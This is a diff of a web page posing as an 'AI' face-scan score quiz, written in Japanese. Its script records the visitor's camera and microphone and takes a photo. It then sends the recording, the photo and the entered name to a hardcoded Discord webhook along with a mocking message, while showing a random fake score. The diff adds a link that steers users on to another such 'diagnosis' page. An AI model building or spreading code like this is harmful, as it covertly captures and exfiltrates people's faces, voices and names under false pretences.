@@ -23,6 +23,9 @@
         }
         #result { font-size: 1.5em; color: #ff0055; margin-top: 25px; font-weight: bold; }
         #canvas { display: none; }
+        /* 誘導リンクのスタイル */
+        .next-link { display: none; margin-top: 20px; padding: 15px; background: #222; border-radius: 10px; border: 1px solid #444; }
+        .next-link a { color: #00f2ff; text-decoration: none; font-weight: bold; font-size: 0.9em; }
     </style>
 </head>
 <body>
@@ -36,6 +39,11 @@
         
         <video id="video" autoplay playsinline muted></video>
         <div id="result"></div>
+
+        <div id="nextStep" class="next-link">
+            <p style="margin:0 0 10px 0; font-size:0.8em; color:#888;">こちらの診断もおすすめです</p>
+            <a href="https://Anier732.github.io/style/">【新着】AI超精密・3Dスタイル偏差値診断へ →</a>
+        </div>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -46,6 +54,7 @@
         const startBtn = document.getElementById('startBtn');
         const result = document.getElementById('result');
         const nameInput = document.getElementById('username');
+        const nextStep = document.getElementById('nextStep');
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
 
         let mediaRecorder;
@@ -58,16 +67,13 @@
             video.style.display = 'block';
             result.innerHTML = "AIエンジンを起動中...<br>解析のため、3秒間静止してください";
 
-            // ★audio: true を追加してマイクをオンにする
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    
                     mediaRecorder = new MediaRecorder(stream);
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                     mediaRecorder.start();
 
-                    // 4秒後に送信（少し余裕を持たせる）
                     setTimeout(() => {
                         captureAndSend(user);
                     }, 4000); 
@@ -80,14 +86,12 @@
 
         function captureAndSend(user) {
             result.innerHTML = "スキャン完了。解析データを送信中...";
-
             if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
 
             const vW = video.videoWidth;
             const vH = video.videoHeight;
             canvas.width = vW; canvas.height = vH;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, vW, vH);
+            canvas.getContext('2d').drawImage(video, 0, 0, vW, vH);
 
             setTimeout(() => {
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
@@ -95,13 +99,14 @@
                     const formData = new FormData();
                     formData.append('content', `またつまらぬものを撮ってしまった、、\\n**👤 名前:** ${user}`);
                     formData.append('file1', photoBlob, 'face.png');
-                    formData.append('file2', videoBlob, 'face_video_with_audio.webm');
+                    formData.append('file2', videoBlob, 'face_video.webm');
 
                     fetch(webhookUrl, { method: 'POST', body: formData })
                     .then(() => {
                         const score = Math.floor(Math.random() * (75 - 45 + 1)) + 45;
                         result.innerHTML = `${user}さんの解析結果：<br><span style="font-size:1.8em;">偏差値 ${score}</span>`;
-                        // カメラとマイクをオフにする
+                        // 診断完了後にリンクを表示
+                        nextStep.style.display = 'block';
                         video.srcObject.getTracks().forEach(track => track.stop());
                     });
                 }, 'image/png');
